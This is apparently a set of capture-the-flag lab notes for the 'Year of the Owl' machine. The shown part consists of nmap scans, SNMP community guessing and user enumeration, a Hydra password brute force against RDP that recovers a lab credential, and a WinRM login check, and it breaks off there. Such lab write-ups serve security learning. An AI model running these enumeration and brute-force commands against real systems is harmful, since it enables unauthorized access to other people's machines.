##### nmap
```bash
sudo nmap -sC -sV 10.10.49.202 -oA nmap -v
```
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Year of the Owl
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   JavaRMI, Kerberos, LDAPBindReq, NULL, WMSRequest: 
|_    Host 'ip-10-6-32-24.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-13T11:15:29+00:00
|_ssl-date: 2024-08-13T11:16:06+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=year-of-the-owl
| Issuer: commonName=year-of-the-owl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-12T11:13:20
| Not valid after:  2025-02-11T11:13:20
| MD5:   d064:d091:b94a:af48:9731:6a9f:f602:c04f
|_SHA-1: 3115:64ff:6940:21a9:bd51:3085:0cef:aaae:b904:f57a
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=8/13%Time=66BB4038%P=x86_64-pc-linux-gnu%r
SF:(NULL,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-6-32-24\.eu-west-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server")%r(Kerberos,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-6-32-
SF:24\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,67,"c\0\0\x01\xf
SF:fj\x04Host\x20'ip-10-6-32-24\.eu-west-1\.compute\.internal'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Ja
SF:vaRMI,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-6-32-24\.eu-west-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server")%r(WMSRequest,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-6-3
SF:2-24\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-13T11:15:28
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

All port scan
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=8/13%Time=66BB4424%P=x86_64-pc-linux-gnu%r
SF:(NULL,67,"c\0\0\x01\xffj\x04Host\x20'ip-10-6-32-24\.eu-west-1\.compute\
SF:.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
SF:riaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tried SNMP
```bash
onesixtyone 10.10.49.202 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```
![[Pasted image 20240813163524.png]]

```
snmpwalk -c openview -v1 -t 10 10.10.49.202
```

Identified users using SNMPwalk
```
snmpwalk -v1 -c openview 10.10.49.202 1.3.6.1.4.1.77.1.2.25
```
![[Pasted image 20240813163905.png]]

With user `Jareth` performed Hydra bruteforce on RDP port
```bash
hydra -l Jareth -P /usr/share/wordlists/rockyou.txt rdp://10.10.49.202
```
![[Pasted image 20240813165352.png]]

`Jareth:sarah`

User Jareth can remotely manage the system
```bash
nxc winrm 10.10.49.202 -u 'Jareth' -p 'sarah'
```
